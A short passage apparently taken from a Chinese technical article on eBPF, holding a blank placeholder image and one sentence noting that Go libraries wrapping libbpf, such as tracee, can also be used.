 ![](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)
 
 当然，也可以使用libbpf包装的go类库实现，比如tracee等产品。
